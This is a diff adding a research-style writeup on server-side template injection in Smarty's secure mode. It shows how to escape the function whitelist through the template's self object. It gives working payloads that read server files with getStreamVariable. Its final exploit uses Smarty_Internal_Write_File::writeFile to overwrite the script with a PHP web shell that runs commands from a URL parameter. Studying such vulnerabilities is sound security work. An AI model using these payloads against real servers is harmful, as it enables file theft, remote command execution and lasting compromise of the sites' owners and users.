@@ -1,0 +1,37 @@
+Smarty
+Smarty is one of the most popular PHP template languages, and offers a secure mode for untrusted template execution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke system(). However, it doesn't prevent us from invoking methods on any classes we can obtain a reference to. The documentation reveals that the $smarty builtin variable can be used to access various environment variables, including the location of the current file at $SCRIPT_NAME. Variable name bruteforcing quickly reveals the self object, which is a reference to the current template. There is very little documentation on this, but the code is all on GitHub.
+
+
+The getStreamVariable method can be used to read any file the server has read+write permission on:
+
+{self::getStreamVariable("file:///proc/self/loginuid")}
+
+1000
+
+{self::getStreamVariable($SCRIPT_NAME)}
+
+<?php
+define("SMARTY_DIR",'/usr/share/php/Smarty/');
+require_once(SMARTY_DIR.'Smarty.class.php');
+... 
+Furthermore, we can call arbitrary static methods. Smarty exposes a range of invaluable static classes, including Smarty_Internal_Write_File, which has the following method:
+
+public function writeFile($_filepath, $_contents, Smarty $smarty)
+This function is designed to create and overwrite arbitrary files, so it can easily be used to create a PHP backdoor inside the webroot, granting us near-complete control over the server. There's one catch - the third argument has a Smarty type hint, so it will reject any non-Smarty type inputs. This means that we need to obtain a reference to a Smarty object.
+
+Further code review reveals that the self::clearConfig() method is suitable:
+
+/**
+* Deassigns a single or all config variables
+*
+* @param  string $varname variable name or null
+*
+* @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining
+*/
+public function clearConfig($varname = null)
+{
+    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
+}
+The final exploit, designed to overwrite the vulnerable file with a backdoor, looks like:
+
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
